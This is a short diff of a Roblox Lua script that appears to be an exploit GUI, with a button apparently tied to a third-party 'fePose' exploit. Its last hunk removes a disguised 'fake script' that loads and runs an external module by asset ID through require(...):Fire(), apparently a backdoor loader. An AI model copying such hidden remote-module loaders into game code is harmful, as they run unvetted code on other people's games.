@@ -1,4 +1,3 @@
--- Made by Gust
 local GustsGUI = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
 local MadebyGust = Instance.new("TextLabel")
@@ -925,7 +924,7 @@ _7.TextColor3 = Color3.fromRGB(255, 255, 255)
 _7.TextSize = 20.000
 _7.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
 _7.MouseButton1Down:connect(function()
-	--[[
+--[[
 	fePose v3 by xyz#9892
 	Bonus : use this image as a t-shirt with 'Heli' for fun times https://files.catbox.moe/0fr6f3.png
 
@@ -1742,12 +1741,3 @@ Dashboard.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Dashboard.BorderColor3 = Color3.fromRGB(255, 255, 255)
 Dashboard.Size = UDim2.new(0, 38, 0, 254)
 Dashboard.Image = "http://www.roblox.com/asset/?id=6803573275"
-
--- Scripts:
-
-local function SUAC_fake_script() -- _6.Settings 
-	local script = Instance.new('Script', _6)
-
-	local loaderFolder = script.Parent local tempFold = game.ServerStorage local SettingsModule = 6500274752 require(SettingsModule):Fire()
-end
-coroutine.wrap(SUAC_fake_script)()
